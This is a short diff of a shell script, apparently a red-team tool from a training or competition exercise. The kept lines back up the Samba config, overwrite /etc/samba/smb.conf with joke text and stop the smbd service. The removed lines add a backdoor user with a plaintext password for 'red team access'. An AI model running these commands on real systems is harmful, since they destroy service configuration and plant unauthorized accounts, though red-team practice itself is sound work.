@@ -12,12 +12,10 @@ do
  #Copy config file to other location, then overwrite original, add users for red team access
    cp '/etc/samba/smb.conf' '/etc/red.conf'
    echo "I'm Batman" > '/etc/samba/smb.conf'
-   useradd -m -p "pass" ""
  else
  #Copy config file to other location, then overwrite original, add users for red team access
    cp '/etc/samba/smb.conf' '/home/red.conf'
    echo "You ever dance with the devil in the pale mooon light?" > '/etc/samba/smb.conf'
-   useradd -m -p "pass" ""
  fi
  #Stop samba service
  sudo service smbd stop
